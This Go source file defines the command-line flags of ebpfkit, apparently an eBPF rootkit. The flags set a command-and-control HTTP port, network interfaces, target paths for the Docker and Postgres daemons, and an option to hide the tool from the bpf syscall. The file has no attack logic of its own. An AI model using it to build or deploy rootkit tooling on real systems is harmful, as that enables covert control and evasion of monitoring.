/*
Copyright © 2020 GUILLAUME FOURNIER

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/

package run

import (
	"github.com/spf13/cobra"
)

// EBPFKit represents the base command of ebpfKit
var EBPFKit = &cobra.Command{
	Use:  "ebpfkit",
	RunE: ebpfKitCmd,
}

var options CLIOptions

func init() {
	EBPFKit.Flags().VarP(
		NewLogLevelSanitizer(&options.LogLevel),
		"log-level",
		"l",
		`log level, options: panic, fatal, error, warn, info, debug or trace`)
	EBPFKit.Flags().IntVarP(
		&options.EBPFKit.TargetHTTPServerPort,
		"target-http-server-port",
		"p",
		8000,
		"Target HTTP server port used for C&C")
	EBPFKit.Flags().StringVarP(
		&options.EBPFKit.IngressIfname,
		"ingress",
		"i",
		"enp0s3",
		"ingress interface name")
	EBPFKit.Flags().StringVarP(
		&options.EBPFKit.EgressIfname,
		"egress",
		"e",
		"enp0s3",
		"egress interface name")
	EBPFKit.Flags().StringVar(
		&options.EBPFKit.DockerDaemonPath,
		"docker",
		"/usr/bin/dockerd",
		"path to the Docker daemon executable")
	EBPFKit.Flags().StringVar(
		&options.EBPFKit.PostgresqlPath,
		"postgres",
		"/usr/lib/postgresql/12/bin/postgres",
		"path to the Postgres daemon executable")
	EBPFKit.Flags().BoolVar(
		&options.EBPFKit.DisableNetwork,
		"disable-network-probes",
		false,
		"when set, ebpfkit will not try to load its network related probes")
	EBPFKit.Flags().BoolVar(
		&options.EBPFKit.DisableBPFObfuscation,
		"disable-bpf-obfuscation",
		false,
		"when set, ebpfkit will not hide itself from the bpf syscall")
}
